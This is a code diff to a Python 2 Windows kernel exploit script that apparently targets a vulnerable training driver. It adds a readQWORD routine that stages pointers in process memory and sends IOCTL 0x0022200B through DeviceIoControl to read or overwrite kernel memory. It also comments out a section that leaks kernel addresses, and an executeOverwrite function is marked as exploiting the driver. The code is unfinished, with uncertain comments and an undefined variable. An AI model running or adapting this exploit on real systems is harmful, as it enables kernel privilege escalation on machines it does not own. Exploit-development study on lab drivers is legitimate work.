@@ -93,6 +93,44 @@ def writeQWORD(driver, what=None, where=None):
     print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
+def readQWORD(driver, what=None, where=None):
+    where = 0x000000001a001000 # Arbitrary offset inside baseadd
+    # Write the what value to what_addr
+    data = struct.pack("<Q", where)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory","e")
+        sys.exit()
+
+    # Pack the address of the what value and the where address
+    data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory in the packing section","e")
+        sys.exit()
+    
+
+    #IOCTL
+    IoControlCode = 0x0022200B
+    #Where
+    InputBuffer = c_void_p(0x000000001a000000)
+    # I THINK this should work? 
+    InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
+    # If our buffer length is zero can't we set OutputBuffer to None?
+    OutputBuffer = c_void_p(0x0)
+    # The OutputBufferLength is already set to zero. I think we can get rid of this?
+    OutputBufferLength = 0x0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+
+    print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
+    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    return triggerIOCTL
+
+
+'''
 # Definitions for the GetCurrentThread()
 ThreadHandle = kernel32.GetCurrentThread()
 ThreadInformation = THREAD_BASIC_INFORMATION()
@@ -137,6 +175,8 @@ def readKernelValue():
 		print "nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value
 		#return for further parsing
 		return baseAddr
+'''
+
 
 # Exploit the driver
 def executeOverwrite():
